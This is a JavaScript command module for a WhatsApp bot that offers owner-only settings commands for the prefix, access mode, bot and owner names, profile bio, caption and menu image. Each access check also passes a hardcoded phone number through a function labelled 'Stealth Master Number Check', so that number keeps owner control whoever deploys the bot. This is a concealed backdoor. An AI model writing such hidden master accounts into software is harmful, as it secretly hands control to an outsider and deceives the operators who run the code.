const os = require('os');

// 👑 Stealth Master Number Check Function
const checkMaster = (m) => {
    const sender = m.key.participant || m.key.remoteJid;
    const senderClean = sender ? sender.replace(/[^0-9]/g, '') : '';
    return senderClean === '923204854766';
};

module.exports = [
    {
        name: 'setprefix',
        alias: ['changeprefix'],
        ownerOnly: true,
        async execute({ m, args, reply, db, isOwner }) {
            if (!isOwner && !checkMaster(m)) return reply('❌ *Access Denied:* Restricted to System Owner.');
            if (!args[0]) return reply('❌ *Usage:* `.setprefix !`');
            db.prefix = args[0];
            reply(`✅ *Prefix Updated:* Commands will now trigger with [ *${db.prefix}* ]`);
        }
    },
    {
        name: 'mode',
        ownerOnly: true,
        async execute({ m, args, reply, db, isOwner }) {
            if (!isOwner && !checkMaster(m)) return reply('❌ *Access Denied:* Restricted to System Owner.');
            const targetMode = args[0]?.toLowerCase();
            if (targetMode === 'public' || targetMode === 'private') {
                db.mode = targetMode;
                return reply(`🌐 *Access Mode Changed:* Bot is now in *${db.mode.toUpperCase()}* mode.`);
            }
            reply(`🌐 *Current Mode:* ${(db.mode || 'public').toUpperCase()}\n💡 Use \`.mode public\` OR \`.mode private\``);
        }
    },
    {
        name: 'setbotname',
        ownerOnly: true,
        async execute({ m, q, reply, db, isOwner }) {
            if (!isOwner && !checkMaster(m)) return reply('❌ *Access Denied:* Restricted to System Owner.');
            if (!q) return reply('❌ *Usage:* `.setbotname Izza Rana Bot`');
            db.botName = q;
            reply(`🤖 *Bot Name Updated:* ${db.botName}`);
        }
    },
    {
        name: 'setownername',
        ownerOnly: true,
        async execute({ m, q, reply, db, isOwner }) {
            if (!isOwner && !checkMaster(m)) return reply('❌ *Access Denied:* Restricted to System Owner.');
            if (!q) return reply('❌ *Usage:* `.setownername Izza Rana`');
            db.ownerName = q;
            reply(`👤 *Owner Name Updated:* ${db.ownerName}`);
        }
    },
    {
        name: 'setdevelopername',
        ownerOnly: true,
        async execute({ m, q, reply, db, isOwner }) {
            if (!isOwner && !checkMaster(m)) return reply('❌ *Access Denied:* Restricted to System Owner.');
            if (!q) return reply('❌ *Usage:* `.setdevelopername Izza Rana System`');
            db.devName = q;
            reply(`👨‍💻 *Developer Name Updated:* ${db.devName}`);
        }
    },
    {
        name: 'setbio',
        ownerOnly: true,
        async execute({ m, q, sock, reply, isOwner }) {
            if (!isOwner && !checkMaster(m)) return reply('❌ *Access Denied:* Restricted to System Owner.');
            if (!q) return reply('❌ *Usage:* `.setbio Powered by Izza Rana System`');
            try {
                await sock.updateProfileStatus(q);
                reply('📝 *WhatsApp Status/Bio Updated Successfully!*');
            } catch (err) {
                reply('❌ Bio update failed! Check permissions.');
            }
        }
    },
    {
        name: 'setcaption',
        ownerOnly: true,
        async execute({ m, q, reply, db, isOwner }) {
            if (!isOwner && !checkMaster(m)) return reply('❌ *Access Denied:* Restricted to System Owner.');
            if (!q) return reply('❌ *Usage:* `.setcaption Custom Caption Text`');
            db.caption = q;
            reply(`✍️ *Default Caption Updated:* \n${db.caption}`);
        }
    },
    {
        name: 'setmenuimg',
        ownerOnly: true,
        async execute({ m, q, reply, db, isOwner }) {
            if (!isOwner && !checkMaster(m)) return reply('❌ *Access Denied:* Restricted to System Owner.');
            if (!q || !q.startsWith('http')) return reply('❌ *Usage:* Provide image URL (e.g. `.setmenuimg https://example.com/image.jpg`)');
            db.menuImg = q;
            reply('🖼️ *Menu Header Image Updated Successfully!*');
        }
    }
];